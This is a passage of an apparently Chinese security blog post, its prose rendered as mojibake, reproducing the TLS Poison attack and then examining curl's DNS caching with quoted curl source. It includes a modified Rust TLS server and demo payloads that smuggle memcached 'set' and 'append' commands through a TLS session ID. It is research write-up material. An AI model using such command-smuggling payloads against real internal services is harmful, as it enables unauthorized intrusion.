&amp;maybe_resume) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>.start_resumption(sess,</span><br><span class="line">      client_hello, sni.as_ref(),</span><br><span class="line">      &amp;client_hello.session_id,</span><br><span class="line">      maybe_resume.unwrap());</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æŠŠ main.rs#734 ä»¥ä¸‹ä¸¤è¡Œè¿›è¡Œæ³¨é‡Šå³å¯ï¼š</p><p></p><figure class="highlight rust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// config = make_config(&amp;args, session_id_generator.clone());</span></span><br><span class="line"><span class="hljs-comment">// tlsserv.tls_config = config;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>è™½ç„¶å¯ä»¥ debug æ‰¾åˆ°é—®é¢˜æ‰€åœ¨ï¼Œä½†æ˜¯å¹¶ä¸èƒ½å®Œç¾åœ°ä¿®æ­£è¿™ä¸ªé—®é¢˜ï¼Œåªèƒ½åšä¸ªä¸´æ—¶çš„å¤„ç†åŠæ³•æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè€Œä¸”è‡ªå·±æ—¶é—´ç²¾åŠ›å¹¶ä¸å¤ªè¶³å¤Ÿï¼Œæ‰€ä»¥å¦‚æœæœ‰åŒå­¦æœ‰æ¯”è¾ƒå¥½çš„åŠæ³•è§£å†³è¿™ä¸ªé—®é¢˜æ¬¢è¿æ PR ä¿®æ­£è¿™ä¸ªé—®é¢˜ï¼</p><p>ç„¶ååœ¨ redis ä¸­ä¿®æ”¹ payload ä¸º 32 å­—èŠ‚é•¿åº¦ï¼š<code>set payload "\r\nset foo 0 0 13\nI am so poor.\r\n"</code>ã€‚å¥½äº†ï¼Œé‚£å°±è®©æˆ‘ä»¬æ¥è¯•ä¸€ä¸‹å§ï¼</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/7.png" alt=""></p><p>è™½ç„¶æˆ‘ä»¬åªèƒ½ä½¿ç”¨ 32 å­—èŠ‚çš„ Session ID ï¼Œä½†æ˜¯å¯¹äº memcahed ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>append</code>å‘½ä»¤è¿›è¡Œè¿½åŠ ï¼Œä¾‹å¦‚ï¼š<code>set payload "\nappend foo 0 0 11\nSo so poor.\r\n"</code>ã€‚å¹¶ä¸”å› ä¸ºæˆ‘ä»¬æ³¨é‡Šäº†é‚£ä¸¤è¡Œï¼Œæ‰€ä»¥å¯¹äºé‡æ–°è®¾ç½®äº†çš„ payload ï¼Œæˆ‘ä»¬éœ€è¦é‡æ–°å¯åŠ¨ä¸€æ¬¡ TLS Server </p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/8.png" alt=""></p><p>å¥½äº†ï¼Œä»¥ä¸Šå°±æ˜¯æˆ‘ä»¬å…³äº TLS Poison æ¼æ´å¤ç°çš„éƒ¨åˆ†ã€‚</p><h3 id="Attack-Impact"><a href="#Attack-Impact" class="headerlink" title="Attack Impact"></a>Attack Impact</h3><p>åœ¨ä½œè€…çš„æŠ¥å‘Šä¸­æŒ‡å‡ºå¦‚ä¸‹çš„ Client å¯¹ TLS ä¼šè¯è¿›è¡Œäº†ç¼“å­˜ï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/9.jpg" alt=""></p><p>ä½œè€…è¿˜ç»™å‡ºäº†åœ¨å†…ç½‘ä¸­æ˜“å—æ”»å‡»çš„æœåŠ¡ï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/10.jpg" alt=""></p><h2 id="More-Than-TLS-Poison"><a href="#More-Than-TLS-Poison" class="headerlink" title="More Than TLS Poison"></a>More Than TLS Poison</h2><p>æ¥ä¸‹æ¥å°±æ˜¯åœ¨å¤ç°ã€æ¢ç´¢ TLS Poison æ”»å‡»é‡åˆ°çš„ä¸€äº›é—®é¢˜ä»¥åŠç›¸åº”çš„æ¢ç´¢ï¼Œæˆ‘è§‰å¾—å…¶ä¸­æœ‰ä¸€äº›ä¼šæ¯”æ”»å‡»æœ¬èº«æ›´å€¼å¾—æ¢ç©¶ã€‚</p><h3 id="cURL-DNS-Cache"><a href="#cURL-DNS-Cache" class="headerlink" title="cURL DNS Cache"></a>cURL DNS Cache</h3><p>å…³äº curl å­˜åœ¨ DNS ç¼“å­˜çš„é—®é¢˜ï¼Œå½“æ—¶å¤ç°çš„æ—¶å€™ï¼Œå³ä½¿æˆ‘ä»¬å·²ç»è®¾ç½®äº† DNS è®°å½• TTL ä¸º 0 ï¼Œ curl ä¹Ÿä¼šæœ‰ä¸€å®šæ—¶é—´çš„ç¼“å­˜ï¼Œè¿™è®©æˆ‘å½“æ—¶æ„Ÿåˆ°éå¸¸è¯§å¼‚ï¼Œç‰¹åˆ«æƒ³äº†è§£ curl å¯¹äº DNS ç¼“å­˜çš„å¤„ç†ã€‚</p><p>äºæ˜¯ä¹ï¼Œç›´æ¥ build äº†å½“æ—¶æœ€æ–°çš„ curl 7.75.0 ï¼ŒæŠ„èµ· gdb å°±å¼€å§‹ä¸€é¡¿ debug ï¼Œä¸€å¼€å§‹æˆ‘è·Ÿä¸€ä½ C è¯­è¨€å®¡è®¡å¸¦å¸ˆè°ƒçš„æ—¶å€™è§‰å¾— curl çš„ä»£ç åº”è¯¥ä¼šæ¯”è¾ƒç®€å•â€¦å¯è°çŸ¥å¼„èµ·æ¥è¿˜æ¯”è¾ƒéº»çƒ¦ï¼Œå°¤å…¶æ˜¯å¯¹äºæˆ‘è¿™ç§ä¸æ˜¯ç‰¹åˆ«ç†Ÿæ‚‰ C è¯­è¨€çš„ Web é€‰æ‰‹æ¥è¯´ï¼Œè°ƒè¯•å‘è¿˜æ˜¯æŒºå¤šçš„ï¼Œå°¤å…¶ curl è¿˜ä½¿ç”¨äº†å¤šçº¿ç¨‹å¤„ç†â€¦æˆ‘åœ¨è°ƒè¯•çš„æ—¶å€™è¿˜æ˜¯ç›¸å½“æ‡µé€¼çš„ï¼ŒæœŸé—´ä¹Ÿè®©æˆ‘å­¦ä¹ åˆ°äº†å¾ˆå¤šè°ƒè¯•å°æŠ€å·§ã€‚</p><p>curl åœ¨ lib/hostip.c#575 å½“ä¸­ä¼šè°ƒç”¨<code>Curl_resolv</code>å‡½æ•°ï¼Œå…¶ä¸­åˆä¼šè°ƒç”¨<code>Curl_getaddrinfo</code>å‡½æ•°å¯åŠ¨ä¸€ä¸ªæ–°çº¿ç¨‹å»æŸ¥è¯¢ DNS ï¼Œå…¶ä¸­ä¸»è¦ä½¿ç”¨äº†<code>Curl_getaddrinfo_ex</code>å°è£…äº†<code>getaddrinfo</code>è¿™ä¸ª libc å‡½æ•°ï¼Œå¾—åˆ°çš„ç»“æœä¼šä½¿ç”¨<code>Curl_cache_addr</code>è¿›è¡Œç¼“å­˜ï¼Œè€Œè¿›è¡Œç¼“å­˜ä¸»è¦æ“ä½œå°±æ˜¯ curl è‡ªå·±ç»´æŠ¤äº†ä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œç¬¬ä¸€æ¬¡æŸ¥è¯¢å¾—åˆ°ç»“æœå°±ä¼šä½¿ç”¨<code>Curl_cache_addr</code>æ”¾å…¥å“ˆå¸Œè¡¨å½“ä¸­ï¼Œä¸»è¦å‡½æ•°å®ç°å¦‚ä¸‹ï¼š </p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * Curl_cache_addr() stores a 'Curl_addrinfo' struct in the DNS cache.</span></span><br><span class="line"><span class="hljs-comment"> *</span></span><br><span class="line"><span class="hljs-comment"> * When calling Curl_resolv() has resulted in a response with a returned</span></span><br><span class="line"><span class="hljs-comment"> * address, we call this function to store the information in the dns</span></span><br><span class="line"><span class="hljs-comment"> * cache etc</span></span><br><span class="line"><span class="hljs-comment"> *</span></span><br><span class="line"><span class="hljs-comment"> * Returns the Curl_dns_entry entry pointer or NULL if the storage failed.</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_dns_entry</span> *</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-title">Curl_cache_addr</span>(<span class="hljs-title">struct</span> <span class="hljs-title">Curl_easy</span> *<span class="hljs-title">data</span>,</span></span><br><span class="line"><span class="hljs-class">                <span class="hljs-title">struct</span> <span class="hljs-title">Curl_addrinfo</span> *<span class="hljs-title">addr</span>,</span></span><br><span class="line"><span class="hljs-class">                <span class="hljs-title">const</span> <span class="hljs-title">char</span> *<span class="hljs-title">hostname</span>,</span></span><br><span class="line"><span class="hljs-class">                <span class="hljs-title">int</span> <span class="hljs-title">port</span>)</span></span><br><span class="line"><span class="hljs-class">{</span></span><br><span class="line">  <span class="hljs-keyword">char</span> entry_id[MAX_HOSTCACHE_LEN];</span><br><span class="line">  <span class="hljs-keyword">size_t</span> entry_len;</span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_dns_entry</span> *<span class="hljs-title">dns</span>;</span></span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_dns_entry</span> *<span class="hljs-title">dns2</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> CURL_DISABLE_SHUFFLE_DNS</span></span><br><span class="line">  <span class="hljs-comment">/* shuffle addresses if requested */</span></span><br><span class="line">  <span class="hljs-keyword">if</span>(data-&gt;<span class="hljs-built_in">set</span>.dns_shuffle_addresses) {</span><br><span class="line">    CURLcode result = Curl_shuffle_addr(data, &amp;addr);</span><br><span class="line">    <span class="hljs-keyword">if</span>(result)</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;</span><br><span class="line">  }</span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/* Create a new cache entry */</span></span><br><span class="line">  dns = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(struct Curl_dns_entry));</span><br><span class="line">  <span class="hljs-keyword">if</span>(!dns) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/* Create an entry id, based upon the hostname and port */</span></span><br><span class="line">  create_hostcache_id(hostname, port, entry_id, <span class="hljs-keyword">sizeof</span>(entry_id));</span><br><span class="line">  entry_len = <span class="hljs-built_in">strlen</span>(entry_id);</span><br><span class="line"></span><br><span class="line">  dns-&gt;inuse = <span class="hljs-number">1</span>;   <span class="hljs-comment">/* the cache has the first reference */</span></span><br><span class="line">  dns-&gt;addr = addr; <span class="hljs-comment">/* this is the address(es) */</span></span><br><span class="line">  time(&amp;dns-&gt;timestamp);</span><br><span class="line">  <span class="hljs-keyword">if</span>(dns-&gt;timestamp == <span class="hljs-number">0</span>)</span><br><span class="line">    dns-&gt;timestamp = <span class="hljs-number">1</span>;   <span class="hljs-comment">/* zero indicates permanent CURLOPT_RESOLVE entry */</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/* Store the resolved data in our DNS cache. */</span></span><br><span class="line">  dns2 = Curl_hash_add(data-&gt;dns.hostcache, entry_id, entry_len + <span class="hljs-number">1</span>,</span><br><span class="line">                       (<span class="hljs-keyword">void</span> *)dns);</span><br><span class="line">  <span class="hljs-keyword">if</span>(!dns2) {</span><br><span class="line">    <span class="hljs-built_in">free</span>(dns);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  dns = dns2;</span><br><span class="line">  dns-&gt;inuse++;         <span class="hljs-comment">/* mark entry as in-use */</span></span><br><span class="line">  <span 